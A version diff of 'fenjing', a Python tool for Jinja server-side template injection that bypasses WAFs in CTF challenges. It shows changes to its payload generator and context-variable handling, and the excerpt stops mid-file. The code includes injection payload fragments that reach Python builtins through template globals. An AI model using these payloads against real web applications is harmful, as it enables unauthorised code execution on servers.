# Comparing `tmp/fenjing-0.3.9.tar.gz` & `tmp/fenjing-0.4.0.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "fenjing-0.3.9.tar", last modified: Thu Jun 15 06:22:16 2023, max compression
+gzip compressed data, was "fenjing-0.4.0.tar", last modified: Thu Jul  6 16:03:29 2023, max compression
```

## Comparing `fenjing-0.3.9.tar` & `fenjing-0.4.0.tar`

### file list

```diff
@@ -1,37 +1,37 @@
-drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-06-15 06:22:16.934390 fenjing-0.3.9/
--rw-r--r--   0 runner    (1001) docker     (123)    16725 2023-06-15 06:22:04.000000 fenjing-0.3.9/LICENSE
--rw-r--r--   0 runner    (1001) docker     (123)      114 2023-06-15 06:22:04.000000 fenjing-0.3.9/MANIFEST.in
--rw-r--r--   0 runner    (1001) docker     (123)     6552 2023-06-15 06:22:16.934390 fenjing-0.3.9/PKG-INFO
--rwxr-xr-x   0 runner    (1001) docker     (123)     6115 2023-06-15 06:22:04.000000 fenjing-0.3.9/README.md
--rw-r--r--   0 runner    (1001) docker     (123)        6 2023-06-15 06:22:04.000000 fenjing-0.3.9/VERSION
-drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-06-15 06:22:16.930390 fenjing-0.3.9/fenjing/
--rwxr-xr-x   0 runner    (1001) docker     (123)      242 2023-06-15 06:22:04.000000 fenjing-0.3.9/fenjing/__init__.py
--rw-r--r--   0 runner    (1001) docker     (123)       60 2023-06-15 06:22:04.000000 fenjing-0.3.9/fenjing/__main__.py
--rw-r--r--   0 runner    (1001) docker     (123)     8080 2023-06-15 06:22:04.000000 fenjing-0.3.9/fenjing/cli.py
--rw-r--r--   0 runner    (1001) docker     (123)      800 2023-06-15 06:22:04.000000 fenjing-0.3.9/fenjing/colorize.py
--rw-r--r--   0 runner    (1001) docker     (123)      838 2023-06-15 06:22:04.000000 fenjing-0.3.9/fenjing/config_payload.py
--rw-r--r--   0 runner    (1001) docker     (123)     1586 2023-06-15 06:22:04.000000 fenjing-0.3.9/fenjing/const.py
--rw-r--r--   0 runner    (1001) docker     (123)     2670 2023-06-15 06:22:04.000000 fenjing-0.3.9/fenjing/form.py
--rw-r--r--   0 runner    (1001) docker     (123)     5823 2023-06-15 06:22:04.000000 fenjing-0.3.9/fenjing/form_cracker.py
--rwxr-xr-x   0 runner    (1001) docker     (123)     5080 2023-06-15 06:22:04.000000 fenjing-0.3.9/fenjing/full_payload_gen.py
--rwxr-xr-x   0 runner    (1001) docker     (123)     2846 2023-06-15 06:22:04.000000 fenjing-0.3.9/fenjing/int_vars.py
--rw-r--r--   0 runner    (1001) docker     (123)    30746 2023-06-15 06:22:04.000000 fenjing-0.3.9/fenjing/payload_gen.py
--rw-r--r--   0 runner    (1001) docker     (123)     1640 2023-06-15 06:22:04.000000 fenjing-0.3.9/fenjing/requester.py
--rw-r--r--   0 runner    (1001) docker     (123)     1180 2023-06-15 06:22:04.000000 fenjing-0.3.9/fenjing/scan_url.py
--rw-r--r--   0 runner    (1001) docker     (123)      941 2023-06-15 06:22:04.000000 fenjing-0.3.9/fenjing/shell_payload.py
-drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-06-15 06:22:16.934390 fenjing-0.3.9/fenjing/templates/
--rw-r--r--   0 runner    (1001) docker     (123)     9139 2023-06-15 06:22:04.000000 fenjing-0.3.9/fenjing/templates/index.html
--rw-r--r--   0 runner    (1001) docker     (123)     3733 2023-06-15 06:22:04.000000 fenjing-0.3.9/fenjing/waf_func_gen.py
--rw-r--r--   0 runner    (1001) docker     (123)     9104 2023-06-15 06:22:04.000000 fenjing-0.3.9/fenjing/webui.py
-drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-06-15 06:22:16.934390 fenjing-0.3.9/fenjing.egg-info/
--rw-r--r--   0 runner    (1001) docker     (123)     6552 2023-06-15 06:22:16.000000 fenjing-0.3.9/fenjing.egg-info/PKG-INFO
--rw-r--r--   0 runner    (1001) docker     (123)      639 2023-06-15 06:22:16.000000 fenjing-0.3.9/fenjing.egg-info/SOURCES.txt
--rw-r--r--   0 runner    (1001) docker     (123)        1 2023-06-15 06:22:16.000000 fenjing-0.3.9/fenjing.egg-info/dependency_links.txt
--rw-r--r--   0 runner    (1001) docker     (123)       43 2023-06-15 06:22:16.000000 fenjing-0.3.9/fenjing.egg-info/requires.txt
--rw-r--r--   0 runner    (1001) docker     (123)        8 2023-06-15 06:22:16.000000 fenjing-0.3.9/fenjing.egg-info/top_level.txt
--rw-r--r--   0 runner    (1001) docker     (123)       43 2023-06-15 06:22:04.000000 fenjing-0.3.9/requirements.txt
--rw-r--r--   0 runner    (1001) docker     (123)       38 2023-06-15 06:22:16.934390 fenjing-0.3.9/setup.cfg
--rw-r--r--   0 runner    (1001) docker     (123)      944 2023-06-15 06:22:04.000000 fenjing-0.3.9/setup.py
-drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-06-15 06:22:16.934390 fenjing-0.3.9/tests/
--rw-r--r--   0 runner    (1001) docker     (123)     3000 2023-06-15 06:22:04.000000 fenjing-0.3.9/tests/test_full_payload_gen.py
--rw-r--r--   0 runner    (1001) docker     (123)     3475 2023-06-15 06:22:04.000000 fenjing-0.3.9/tests/test_payload_gen.py
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-07-06 16:03:29.234401 fenjing-0.4.0/
+-rw-r--r--   0 runner    (1001) docker     (123)    16725 2023-07-06 16:03:19.000000 fenjing-0.4.0/LICENSE
+-rw-r--r--   0 runner    (1001) docker     (123)      114 2023-07-06 16:03:19.000000 fenjing-0.4.0/MANIFEST.in
+-rw-r--r--   0 runner    (1001) docker     (123)     6557 2023-07-06 16:03:29.234401 fenjing-0.4.0/PKG-INFO
+-rwxr-xr-x   0 runner    (1001) docker     (123)     6120 2023-07-06 16:03:19.000000 fenjing-0.4.0/README.md
+-rw-r--r--   0 runner    (1001) docker     (123)        6 2023-07-06 16:03:19.000000 fenjing-0.4.0/VERSION
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-07-06 16:03:29.234401 fenjing-0.4.0/fenjing/
+-rwxr-xr-x   0 runner    (1001) docker     (123)      199 2023-07-06 16:03:19.000000 fenjing-0.4.0/fenjing/__init__.py
+-rw-r--r--   0 runner    (1001) docker     (123)       60 2023-07-06 16:03:19.000000 fenjing-0.4.0/fenjing/__main__.py
+-rw-r--r--   0 runner    (1001) docker     (123)     8080 2023-07-06 16:03:19.000000 fenjing-0.4.0/fenjing/cli.py
+-rw-r--r--   0 runner    (1001) docker     (123)      800 2023-07-06 16:03:19.000000 fenjing-0.4.0/fenjing/colorize.py
+-rw-r--r--   0 runner    (1001) docker     (123)      838 2023-07-06 16:03:19.000000 fenjing-0.4.0/fenjing/config_payload.py
+-rw-r--r--   0 runner    (1001) docker     (123)     1624 2023-07-06 16:03:19.000000 fenjing-0.4.0/fenjing/const.py
+-rw-r--r--   0 runner    (1001) docker     (123)     2305 2023-07-06 16:03:19.000000 fenjing-0.4.0/fenjing/context_vars.py
+-rw-r--r--   0 runner    (1001) docker     (123)     2670 2023-07-06 16:03:19.000000 fenjing-0.4.0/fenjing/form.py
+-rw-r--r--   0 runner    (1001) docker     (123)     5823 2023-07-06 16:03:19.000000 fenjing-0.4.0/fenjing/form_cracker.py
+-rwxr-xr-x   0 runner    (1001) docker     (123)     5246 2023-07-06 16:03:19.000000 fenjing-0.4.0/fenjing/full_payload_gen.py
+-rw-r--r--   0 runner    (1001) docker     (123)    31714 2023-07-06 16:03:19.000000 fenjing-0.4.0/fenjing/payload_gen.py
+-rw-r--r--   0 runner    (1001) docker     (123)     1640 2023-07-06 16:03:19.000000 fenjing-0.4.0/fenjing/requester.py
+-rw-r--r--   0 runner    (1001) docker     (123)     1180 2023-07-06 16:03:19.000000 fenjing-0.4.0/fenjing/scan_url.py
+-rw-r--r--   0 runner    (1001) docker     (123)      941 2023-07-06 16:03:19.000000 fenjing-0.4.0/fenjing/shell_payload.py
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-07-06 16:03:29.234401 fenjing-0.4.0/fenjing/templates/
+-rw-r--r--   0 runner    (1001) docker     (123)     9139 2023-07-06 16:03:19.000000 fenjing-0.4.0/fenjing/templates/index.html
+-rw-r--r--   0 runner    (1001) docker     (123)     3733 2023-07-06 16:03:19.000000 fenjing-0.4.0/fenjing/waf_func_gen.py
+-rw-r--r--   0 runner    (1001) docker     (123)     9104 2023-07-06 16:03:19.000000 fenjing-0.4.0/fenjing/webui.py
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-07-06 16:03:29.234401 fenjing-0.4.0/fenjing.egg-info/
+-rw-r--r--   0 runner    (1001) docker     (123)     6557 2023-07-06 16:03:29.000000 fenjing-0.4.0/fenjing.egg-info/PKG-INFO
+-rw-r--r--   0 runner    (1001) docker     (123)      643 2023-07-06 16:03:29.000000 fenjing-0.4.0/fenjing.egg-info/SOURCES.txt
+-rw-r--r--   0 runner    (1001) docker     (123)        1 2023-07-06 16:03:29.000000 fenjing-0.4.0/fenjing.egg-info/dependency_links.txt
+-rw-r--r--   0 runner    (1001) docker     (123)       43 2023-07-06 16:03:29.000000 fenjing-0.4.0/fenjing.egg-info/requires.txt
+-rw-r--r--   0 runner    (1001) docker     (123)        8 2023-07-06 16:03:29.000000 fenjing-0.4.0/fenjing.egg-info/top_level.txt
+-rw-r--r--   0 runner    (1001) docker     (123)       43 2023-07-06 16:03:19.000000 fenjing-0.4.0/requirements.txt
+-rw-r--r--   0 runner    (1001) docker     (123)       38 2023-07-06 16:03:29.234401 fenjing-0.4.0/setup.cfg
+-rw-r--r--   0 runner    (1001) docker     (123)      944 2023-07-06 16:03:19.000000 fenjing-0.4.0/setup.py
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-07-06 16:03:29.234401 fenjing-0.4.0/tests/
+-rw-r--r--   0 runner    (1001) docker     (123)     5343 2023-07-06 16:03:19.000000 fenjing-0.4.0/tests/test_full_payload_gen.py
+-rw-r--r--   0 runner    (1001) docker     (123)     3475 2023-07-06 16:03:19.000000 fenjing-0.4.0/tests/test_payload_gen.py
```

### Comparing `fenjing-0.3.9/LICENSE` & `fenjing-0.4.0/LICENSE`

 * *Files identical despite different names*

### Comparing `fenjing-0.3.9/PKG-INFO` & `fenjing-0.4.0/PKG-INFO`

 * *Files 11% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: fenjing
-Version: 0.3.9
+Version: 0.4.0
 Summary: A Jinja SSTI cracker for CTF competitions
 Home-page: https://github.com/Marven11/Fenjing
 Author: Marven11
 Author-email: marven11@example.com
 Classifier: Programming Language :: Python :: 3.9
 Classifier: License :: OSI Approved :: Mozilla Public License 2.0 (MPL 2.0)
 Classifier: Operating System :: OS Independent
@@ -204,10 +204,9 @@
 
 ```
 
 其他使用例可以看[这里](examples.md)
 
 ## 项目结构
 
-[![](https://mermaid.ink/img/pako:eNp1U01TwyAQ_SsMM-2p-QM5eHA86kU9aTqZLVkaRgKRD2vt9L8LwZQkrRwYeLzdfbyFE2W6QVpSLvWBtWAceb2vFAnD-t3eQN8S74S0JIFxMC21ET-YEYOfHq1DkyGuTTcNUdblbVqhapaVLJpCqJCIA8NpSSneOdiSQxEOO6FARmybGQfc-cjZRQ4XBrn-TuB2loYUxV3CLyLIQkWUbnPQakWakI85oRV5fpyUBF5zr1i9RzW_eM0MsI-pHZaBqr2Rt3lJ1FW6waCFuB6OUkMz0ZfFjZ2LI7hYf4GZ8GyLUtZ_8bPWcLG_xrnP7PkNb4LzNGQ9LzdccJlxAKf79UL15YGMfbv2djyZ-5vmocv_xC3cvyUvWk83tAvvDUQTvsgphlbUtdhhRcuwVOidAVnRSp0DFbzTL0fFaOmMxw31fQMOHwSE1nU0PExpA9qDetM677ERTpun9A2H33j-BR2iIbY?type=png)](https://mermaid.live/edit#pako:eNp1U01TwyAQ_SsMM-2p-QM5eHA86kU9aTqZLVkaRgKRD2vt9L8LwZQkrRwYeLzdfbyFE2W6QVpSLvWBtWAceb2vFAnD-t3eQN8S74S0JIFxMC21ET-YEYOfHq1DkyGuTTcNUdblbVqhapaVLJpCqJCIA8NpSSneOdiSQxEOO6FARmybGQfc-cjZRQ4XBrn-TuB2loYUxV3CLyLIQkWUbnPQakWakI85oRV5fpyUBF5zr1i9RzW_eM0MsI-pHZaBqr2Rt3lJ1FW6waCFuB6OUkMz0ZfFjZ2LI7hYf4GZ8GyLUtZ_8bPWcLG_xrnP7PkNb4LzNGQ9LzdccJlxAKf79UL15YGMfbv2djyZ-5vmocv_xC3cvyUvWk83tAvvDUQTvsgphlbUtdhhRcuwVOidAVnRSp0DFbzTL0fFaOmMxw31fQMOHwSE1nU0PExpA9qDetM677ERTpun9A2H33j-BR2iIbY)
-
+[![](https://mermaid.ink/img/pako:eNp1U8tuwyAQ_BWElJziH_Chh6rH9tL21Dqy1niJUTG4PJqkUf69YCfBdlwOCIbZ2WEXTpTpGmlOudR71oBx5P2xUCQM66udga4h3glpyQDGwbTURvxiQgx-e7QOTYK4Nu04RFmXtsMKVT3PZNFkQgUhDgzHKaX45GBzDlk4bIUCGbFtYuyx8pFTRQ4XBrk-DOB2IkOy7GHAbybIzEW0blPQakXqoMec0Iq8Po9SAi-5V6zcoZpevGQG2Ne4HJaBKr2Ry7zB1J1cX6CZuQ6OUkM98pfMXTt3qbjDgyt_wIy4tkEpy4vGhMzF7h7nPrGnt1wEpzJkPU3XX3Ku2IPj_XrB-e2hXPt3X-PrybTOw9x3-5-4WReWLMYW0A1tw7sDUYevcoqhBXUNtljQPCwVemdAFrRQ50AF7_TbUTGaO-NxQ31Xg8MnAaGFLQ0PVNqAdqA-tE57rIXT5mX4jv2vPP8BWQ4lKg?type=png)](https://mermaid.live/edit#pako:eNp1U8tuwyAQ_BWElJziH_Chh6rH9tL21Dqy1niJUTG4PJqkUf69YCfBdlwOCIbZ2WEXTpTpGmlOudR71oBx5P2xUCQM66udga4h3glpyQDGwbTURvxiQgx-e7QOTYK4Nu04RFmXtsMKVT3PZNFkQgUhDgzHKaX45GBzDlk4bIUCGbFtYuyx8pFTRQ4XBrk-DOB2IkOy7GHAbybIzEW0blPQakXqoMec0Iq8Po9SAi-5V6zcoZpevGQG2Ne4HJaBKr2Ry7zB1J1cX6CZuQ6OUkM98pfMXTt3qbjDgyt_wIy4tkEpy4vGhMzF7h7nPrGnt1wEpzJkPU3XX3Ku2IPj_XrB-e2hXPt3X-PrybTOw9x3-5-4WReWLMYW0A1tw7sDUYevcoqhBXUNtljQPCwVemdAFrRQ50AF7_TbUTGaO-NxQ31Xg8MnAaGFLQ0PVNqAdqA-tE57rIXT5mX4jv2vPP8BWQ4lKg)
```

### Comparing `fenjing-0.3.9/README.md` & `fenjing-0.4.0/fenjing.egg-info/PKG-INFO`

 * *Files 12% similar despite different names*

```diff
@@ -1,7 +1,20 @@
+Metadata-Version: 2.1
+Name: fenjing
+Version: 0.4.0
+Summary: A Jinja SSTI cracker for CTF competitions
+Home-page: https://github.com/Marven11/Fenjing
+Author: Marven11
+Author-email: marven11@example.com
+Classifier: Programming Language :: Python :: 3.9
+Classifier: License :: OSI Approved :: Mozilla Public License 2.0 (MPL 2.0)
+Classifier: Operating System :: OS Independent
+Description-Content-Type: text/markdown
+License-File: LICENSE
+
 ![焚靖](assets/fenjing.webp)
 
 > Bypass the WAF without knowing WAF
 
 焚靖是一个针对CTF比赛中Jinja SSTI绕过WAF的全自动脚本，可以自动攻击给定的网站或接口。
 
 ## 演示
@@ -191,10 +204,9 @@
 
 ```
 
 其他使用例可以看[这里](examples.md)
 
 ## 项目结构
 
-[![](https://mermaid.ink/img/pako:eNp1U01TwyAQ_SsMM-2p-QM5eHA86kU9aTqZLVkaRgKRD2vt9L8LwZQkrRwYeLzdfbyFE2W6QVpSLvWBtWAceb2vFAnD-t3eQN8S74S0JIFxMC21ET-YEYOfHq1DkyGuTTcNUdblbVqhapaVLJpCqJCIA8NpSSneOdiSQxEOO6FARmybGQfc-cjZRQ4XBrn-TuB2loYUxV3CLyLIQkWUbnPQakWakI85oRV5fpyUBF5zr1i9RzW_eM0MsI-pHZaBqr2Rt3lJ1FW6waCFuB6OUkMz0ZfFjZ2LI7hYf4GZ8GyLUtZ_8bPWcLG_xrnP7PkNb4LzNGQ9LzdccJlxAKf79UL15YGMfbv2djyZ-5vmocv_xC3cvyUvWk83tAvvDUQTvsgphlbUtdhhRcuwVOidAVnRSp0DFbzTL0fFaOmMxw31fQMOHwSE1nU0PExpA9qDetM677ERTpun9A2H33j-BR2iIbY?type=png)](https://mermaid.live/edit#pako:eNp1U01TwyAQ_SsMM-2p-QM5eHA86kU9aTqZLVkaRgKRD2vt9L8LwZQkrRwYeLzdfbyFE2W6QVpSLvWBtWAceb2vFAnD-t3eQN8S74S0JIFxMC21ET-YEYOfHq1DkyGuTTcNUdblbVqhapaVLJpCqJCIA8NpSSneOdiSQxEOO6FARmybGQfc-cjZRQ4XBrn-TuB2loYUxV3CLyLIQkWUbnPQakWakI85oRV5fpyUBF5zr1i9RzW_eM0MsI-pHZaBqr2Rt3lJ1FW6waCFuB6OUkMz0ZfFjZ2LI7hYf4GZ8GyLUtZ_8bPWcLG_xrnP7PkNb4LzNGQ9LzdccJlxAKf79UL15YGMfbv2djyZ-5vmocv_xC3cvyUvWk83tAvvDUQTvsgphlbUtdhhRcuwVOidAVnRSp0DFbzTL0fFaOmMxw31fQMOHwSE1nU0PExpA9qDetM677ERTpun9A2H33j-BR2iIbY)
-
+[![](https://mermaid.ink/img/pako:eNp1U8tuwyAQ_BWElJziH_Chh6rH9tL21Dqy1niJUTG4PJqkUf69YCfBdlwOCIbZ2WEXTpTpGmlOudR71oBx5P2xUCQM66udga4h3glpyQDGwbTURvxiQgx-e7QOTYK4Nu04RFmXtsMKVT3PZNFkQgUhDgzHKaX45GBzDlk4bIUCGbFtYuyx8pFTRQ4XBrk-DOB2IkOy7GHAbybIzEW0blPQakXqoMec0Iq8Po9SAi-5V6zcoZpevGQG2Ne4HJaBKr2Ry7zB1J1cX6CZuQ6OUkM98pfMXTt3qbjDgyt_wIy4tkEpy4vGhMzF7h7nPrGnt1wEpzJkPU3XX3Ku2IPj_XrB-e2hXPt3X-PrybTOw9x3-5-4WReWLMYW0A1tw7sDUYevcoqhBXUNtljQPCwVemdAFrRQ50AF7_TbUTGaO-NxQ31Xg8MnAaGFLQ0PVNqAdqA-tE57rIXT5mX4jv2vPP8BWQ4lKg?type=png)](https://mermaid.live/edit#pako:eNp1U8tuwyAQ_BWElJziH_Chh6rH9tL21Dqy1niJUTG4PJqkUf69YCfBdlwOCIbZ2WEXTpTpGmlOudR71oBx5P2xUCQM66udga4h3glpyQDGwbTURvxiQgx-e7QOTYK4Nu04RFmXtsMKVT3PZNFkQgUhDgzHKaX45GBzDlk4bIUCGbFtYuyx8pFTRQ4XBrk-DOB2IkOy7GHAbybIzEW0blPQakXqoMec0Iq8Po9SAi-5V6zcoZpevGQG2Ne4HJaBKr2Ry7zB1J1cX6CZuQ6OUkM98pfMXTt3qbjDgyt_wIy4tkEpy4vGhMzF7h7nPrGnt1wEpzJkPU3XX3Ku2IPj_XrB-e2hXPt3X-PrybTOw9x3-5-4WReWLMYW0A1tw7sDUYevcoqhBXUNtljQPCwVemdAFrRQ50AF7_TbUTGaO-NxQ31Xg8MnAaGFLQ0PVNqAdqA-tE57rIXT5mX4jv2vPP8BWQ4lKg)
```

### Comparing `fenjing-0.3.9/fenjing/cli.py` & `fenjing-0.4.0/fenjing/cli.py`

 * *Files identical despite different names*

### Comparing `fenjing-0.3.9/fenjing/colorize.py` & `fenjing-0.4.0/fenjing/colorize.py`

 * *Files identical despite different names*

### Comparing `fenjing-0.3.9/fenjing/config_payload.py` & `fenjing-0.4.0/fenjing/config_payload.py`

 * *Files identical despite different names*

### Comparing `fenjing-0.3.9/fenjing/const.py` & `fenjing-0.4.0/fenjing/const.py`

 * *Files 2% similar despite different names*

```diff
@@ -1,11 +1,12 @@
 DEFAULT_USER_AGENT = "Fenjing/0.1"
 
 LITERAL = "literal"
 UNSATISFIED = "unsatisfied"
+WITH_CONTEXT_VAR = "with_context_var"
 ZERO = "zero"
 POSITIVE_INTEGER = "positive_integer"
 INTEGER = "integer"
 STRING_STRING_CONCNAT = "string_string_concat"
 STRING_PERCENT = "string_percent"
 STRING_PERCENT_LOWER_C = "string_percent_lower_c"
 STRING_UNDERLINE = "string_underline"
```

### Comparing `fenjing-0.3.9/fenjing/form.py` & `fenjing-0.4.0/fenjing/form.py`

 * *Files identical despite different names*

### Comparing `fenjing-0.3.9/fenjing/form_cracker.py` & `fenjing-0.4.0/fenjing/form_cracker.py`

 * *Files identical despite different names*

### Comparing `fenjing-0.3.9/fenjing/full_payload_gen.py` & `fenjing-0.4.0/fenjing/full_payload_gen.py`

 * *Files 8% similar despite different names*

```diff
@@ -1,36 +1,37 @@
 from typing import Callable, List, Tuple, Union, Dict
 import logging
 
 from . import payload_gen
-from .int_vars import get_useable_int_vars
 from .colorize import colored
+from .context_vars import context_vars_all, filter_by_used_context, filter_by_waf
 from .const import *
 
 logger = logging.getLogger("shell_payload")
 
 
-def get_int_context(waf_func):
-    ints, var_names, payload = get_useable_int_vars(waf_func)
-    if len(ints) == 0:
-        logger.warning("No IntVars For YOU!")
-    return payload, dict(zip(var_names, ints))
-
-
-def get_str_context(waf_func):
-    str_vars = [
-        ("un", "_", "{%set un=((({}|select()|trim|list)[24]))%}"),
-        ("perc", "%", "{%set perc=(lipsum[((({}|select()|trim|list)[24]))*2" +
-         "+dict(globals=x)|join+((({}|select()|trim|list)[24]))*2]" +
-         "[((({}|select()|trim|list)[24]))*2+dict(builtins=x)" +
-         "|join+((({}|select()|trim|list)[24]))*2][dict(chr=x)|join](37))%}"),
-        # ("fc", "{:c}", "{%set fc={{{1:2}|string|replace({1:2}|string|batch(4)|first|last,{}|join)|replace(1|string,{}|join)|replace(2|string,dict(c=1)|join)}}%}")
-    ]
-    str_vars = [tpl for tpl in str_vars if waf_func(tpl[2])]
-    return "".join(payload for _, _, payload in str_vars), {var_name: var_value for var_name, var_value, _ in str_vars}
+# def get_int_context(waf_func):
+#     ints, var_names, payloads = get_passed_int_vars(waf_func)
+#     print(ints, var_names, payloads)
+#     if len(ints) == 0:
+#         logger.warning("No IntVars For YOU!")
+#     return dict(zip(var_names, payloads)), dict(zip(var_names, ints))
+
+
+# def get_str_context(waf_func):
+#     str_vars = [
+#         ("un", "_", "{%set un=((({}|select()|trim|list)[24]))%}"),
+#         ("perc", "%", "{%set perc=(lipsum[((({}|select()|trim|list)[24]))*2" +
+#          "+dict(globals=x)|join+((({}|select()|trim|list)[24]))*2]" +
+#          "[((({}|select()|trim|list)[24]))*2+dict(builtins=x)" +
+#          "|join+((({}|select()|trim|list)[24]))*2][dict(chr=x)|join](37))%}"),
+#         # ("fc", "{:c}", "{%set fc={{{1:2}|string|replace({1:2}|string|batch(4)|first|last,{}|join)|replace(1|string,{}|join)|replace(2|string,dict(c=1)|join)}}%}")
+#     ]
+#     str_vars = [tpl for tpl in str_vars if waf_func(tpl[2])]
+#     return {var_name: payload for var_name, _, payload in str_vars}, {var_name: var_value for var_name, var_value, _ in str_vars}
 
 
 def get_outer_pattern(waf_func):
     outer_payloads = [
         ("{{}}", "{{PAYLOAD}}", True),
         ("{%print()%}", "{%print(PAYLOAD)%}", True),
         ("{%if()%}{%endif%}", "{%if(PAYLOAD)%}{%endif%}", False),
@@ -63,40 +64,38 @@
     @callback.setter
     def callback(self, callback):
         self._callback = callback
         if self.payload_gen:
             self.payload_gen.callback = callback
 
     def do_prepare(self) -> bool:
-        """生成上下文payload，并准备作用payload的最外层（一般为双花括号{{}}）
+        """准备作用payload的最外层（一般为双花括号{{}}），过滤所有可用的payload
 
         Returns:
-            bool: 是否生成成功，失败则无法生成payload。有时生成的
+            bool: 是否生成成功，失败则无法生成payload。
         """
         if self.prepared:
             return True
 
-        int_payload, int_context = get_int_context(self.waf_func)
-        str_payload, str_context = get_str_context(self.waf_func)
+        self.context_payload = filter_by_waf(context_vars_all, self.waf_func)
+
+        self.context = {var_name: var_value for _, d in self.context_payload.items() for var_name, var_value in d.items()}
 
-        self.context_payload, self.context = int_payload + \
-            str_payload, {**int_context, **str_context}
         self.outer_pattern, self.will_print = get_outer_pattern(self.waf_func)
         if not self.outer_pattern:
             return False
         if self.will_print:
             logger.info(f"use {colored('blue', self.outer_pattern)}")
         else:
             logger.warning(
                 f"use {colored('blue', self.outer_pattern)}, which {colored('red', 'will not print')} your result!")
 
         self.payload_gen = payload_gen.PayloadGenerator(self.waf_func, self.context, self.callback)
         self.prepared = True
         self.callback(CALLBACK_PREPARE_FULLPAYLOADGEN, {
-            "context_payload": self.context_payload,
             "context": self.context,
             "outer_pattern": self.outer_pattern,
             "will_print": self.will_print,
         })
         return True
 
     def generate(self, gen_type, *args) -> Tuple[Union[str, None], Union[bool, None]]:
@@ -107,23 +106,24 @@
 
         Returns:
             Tuple[Union[str, None], Union[bool, None]]: payload, 以及payload是否会有回显
         """
         if not self.prepared and not self.do_prepare():
             return None, None
 
-        inner_payload = self.payload_gen.generate(gen_type, *args)
+        ret = self.payload_gen.generate_with_used_context(gen_type, *args)
 
-        if inner_payload is None:
+        if ret is None:
             logger.warning("Bypassing WAF Failed.")
             return None, None
-
+        inner_payload, used_context = ret
+        context_payload = "".join(filter_by_used_context(self.context_payload, used_context).keys())
         assert isinstance(self.outer_pattern, str)
 
-        payload = self.context_payload + self.outer_pattern.replace("PAYLOAD", inner_payload)
+        payload = context_payload + self.outer_pattern.replace("PAYLOAD", inner_payload)
 
         self.callback(CALLBACK_GENERATE_FULLPAYLOAD, {
             "gen_type": gen_type,
             "args": args,
             "payload": payload,
             "will_print": self.will_print,
         })
```

### Comparing `fenjing-0.3.9/fenjing/payload_gen.py` & `fenjing-0.4.0/fenjing/payload_gen.py`

 * *Files 3% similar despite different names*

```diff
@@ -1,147 +1,175 @@
 from collections import defaultdict
 from typing import Callable, DefaultDict, List, Dict, Union, Any
 import re
 import time
 import logging
+import typing
+from typing import Callable, Any, Dict, Tuple
 from .colorize import colored
 from .const import *
 
-req_gens: DefaultDict[str, List[Callable]] = defaultdict(list)
+ContextVariable = Dict[str, Any]
+ReqGenRequirement = Tuple
+
+ReqGenRequirements = List[ReqGenRequirement]
+ReqGenReturn = ReqGenRequirements
+ReqGen = Callable[..., ReqGenReturn]
+ReqGenResult = Tuple[str, ContextVariable]
+
+req_gens: DefaultDict[str, List[ReqGen]] = defaultdict(list)
 used_count = defaultdict(int)
 logger = logging.getLogger("payload_gen")
 
-
-def req_gen(f):
+def req_gen(f: ReqGen):
     gen_type = re.match("gen_([a-z_]+)_([a-z0-9]+)", f.__name__)
     if not gen_type:
         raise Exception(
             f"Error found when register payload generator {f.__name__}")
     req_gens[gen_type.group(1)].append(f)
 
+def hashable(o):
+    try:
+        _ = hash(o)
+        return True
+    except Exception:
+        return False
+
 
 class PayloadGenerator:
     def __init__(
         self,
-        waf_func: Callable,
+        waf_func: Callable[[str], bool],
         context: Union[Dict, None],
         callback: Union[Callable[[str, Dict], None], None] = None
     ):
         self.waf_func = waf_func
-        self.context = context
+        self.context = context if context else {}
         self.cache = {}
-        self.generate_funcs = {
-            LITERAL: self.literal_generate,
-            UNSATISFIED: self.unsatisfied_generate
-        }
-        self.callback: Callable[[str, Dict], None] = callback if callback else (lambda x, y: None)
-
-    def cache_add(self, gen_type, *args, result=None):
-        try:
-            # hash() might fail
-            if (gen_type, *args) in self.cache:
-                return
-            self.cache[(gen_type, *args)] = result
-        except Exception:
-            return
-
-    def cache_has(self, gen_type, *args, result=None):
-        try:
-            # hash() might fail
-            return (gen_type, *args) in self.cache
-        except Exception:
-            return False
-
-    def count_success(self, gen_type, req_gen_func_name):
-        used_count[req_gen_func_name] += 1
-        req_gens[gen_type].sort(
-            key=(lambda gen_func: used_count[gen_func.__name__]), reverse=True)
-
-    def generate_by_req_list(self, req_list):
-        payload = ""
-        for gen_type, *args in req_list:
-            result = self.generate(gen_type, *args)
-            if not result:
-                return None
-            payload += result
-        return payload
-
-    def literal_generate(self, gen_type, *args):
-        return args[0] if self.waf_func(args[0]) else None
-
-    def unsatisfied_generate(self, gen_type, *args):
-        return None
-
-    def cached_generate(self, gen_type, *args):
-        try:
-            # hash() might fail
-            if (gen_type, *args) not in self.cache:
-                return None
-            return self.cache[(gen_type, *args)]
-        except Exception:
+        self.generate_funcs: List[Tuple[
+            Callable[[ReqGenRequirement], bool],
+            Callable[[ReqGenRequirement], ReqGenResult | None]
+        ]]
+        self.generate_funcs = [
+            (
+                (lambda gen_req: gen_req[0] == LITERAL),
+                (lambda gen_req: (gen_req[1], {}))
+            ),
+            (
+                (lambda gen_req: gen_req[0] == UNSATISFIED),
+                (lambda gen_req: None)
+            ),
+            (
+                (lambda gen_req: gen_req[0] == WITH_CONTEXT_VAR),
+                (lambda gen_req: ("", {gen_req[1]: self.context[gen_req[1]]}))
+            ),
+            (
+                (lambda gen_req: hashable(gen_req) and gen_req in self.cache),
+                (lambda gen_req: self.cache[gen_req])
+            ),
+            (
+                (lambda gen_req: True),
+                self.common_generate
+            )
+        ]
+            # LITERAL: self.literal_generate,
+            # UNSATISFIED: self.unsatisfied_generate
+        
+        self.callback = callback if callback else (lambda x, y: None)
+
+    def generate_by_list(self, req_list: List[ReqGenRequirement]) -> ReqGenResult | None:
+        str_result, used_context = "", {}
+        for req in req_list:
+            for checker, runner in self.generate_funcs:
+                if not checker(req):
+                    continue
+                result = runner(req)
+                if result is None:
+                    return None
+                s, c = result
+                # if not self.waf_func(s):
